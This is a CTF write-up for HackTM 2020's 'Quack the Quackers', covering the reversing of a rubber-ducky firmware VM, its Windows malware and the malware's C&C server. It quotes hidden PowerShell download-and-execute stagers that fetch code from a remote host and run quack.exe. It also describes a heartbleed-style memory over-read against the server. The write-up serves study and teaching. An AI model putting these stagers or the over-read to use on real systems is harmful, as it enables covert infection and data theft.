# Quack the Quackers - HackTM 2020 Quals
## Introduction

Quack the Quackers is a pwn task.

A company was compromised with a device similar to a rubber ducky (Hence the
duck references.). We are given a memory dump of this device.

The task consists of two parts : the first consists of reverse-engineering the
memory dump of the device, download the malware and analyze it. The second
consists of exploiting a vulnerability in the malware's command and control
(CnC) server.


## Reverse-engineering of the firmware

The device is said to be a `Digispark`. The firmware contains a mention of
`Digistump` and `Digispark`.

The [official wiki](http://digistump.com/wiki/digispark/tutorials/programming)
makes several mentions of `AVR` and `Attiny`.

Nobody wants to reverse AVR. Calling `strings` on the firmware only yields a
very long string that looks like `QUAAAACK`. All the other strings are
gibberish.

After importing the firmware in Ghidra and wandering around, a particular
function caught our attention: the function at offset 0x600 performs
comparisons of a variable with 'Q', 'A', 'C', 'K' and '!'.

The firmware implements a virtual machine. The instruction ribbon being the long
quack-like string, and the function at 0x600 executes each instructions.

The `U` and `K` instructions are straightforward: they respectively increment
and decrement an accumulator register. (the `Y` register)

The `A` instruction is a bit more complicated. It performs a multiplication of
the accumulator by itself, using a double-and-add algorithm. It effectively
squares the accumulator.

The `Q` and `!` instructions are only present once : at the beginning and the
end of the ribbon. It is very likely that they set up.

The `C` instruction is more frequent than `Q` and `!`. Keeping in mind the
original purpose of the device (i.e. emulate an HID keyboard and send key
presses), one can make an educated guess that this opcode, by a process of
elimination, is the one responsible for sending a keystroke.

These hypothesis can be confirmed by writing a quick interpretor for this
virtual machine (`decode.php`). The keystrokes sent are the following:
```powershell
powershell -noprofile -windowstyle hidden -command "iwr nmdfthufjskdnbfwhejklacms.xyz/-ps|iex"
```

This is a command that starts an hidden instsance powershell, makes it download
a link (`iwr` is an alias to `Invoke-WebRequest`) and execute it (`iex` is an
alias to `Invoke-Expression`).

The `-ps` file contains a similar payload:
```powershell
iwr nmdfthufjskdnbfwhejklacms.xyz/quack.exe -outfile $env:temp/quack.exe
Start-Process -WindowStyle hidden -FilePath $env:temp/quack.exe
```

This payload download a `quack.exe` file, and runs it.


## Reverse-engineering of the Windows malware

The second part of this malware is a Windows binary. Importing it in Ghidra
reveals that this binary connects to a remote server:
`nmdfthufjskdnbfwhejklacms.xyz` on port 19834 (0x4D7A, obfuscated as `MZ`)

A mix of static analysis and packet-sniffing was used to understand the network
protocol used by the malware. It consists of 3 packets:
1. heartbeat (`@`): sends data, server responds with the same data
2. list (`L`): sends a list of files in the current directory, server responds
   with a (random?) filename from this list
3. file (`f`): sends the first 255 bytes of a file selected by the server (sent
   after L)

The heartbeat feature looks awfully like TLS's hearbeat feature, which was
vulnerable to CVE-2014-0160 (dubbed `heartbleed`).

By sending a heartbeat packet of size 255, with no data, and closing the sending
end of the socket, the remote server will reply with data that has not been
cleared.
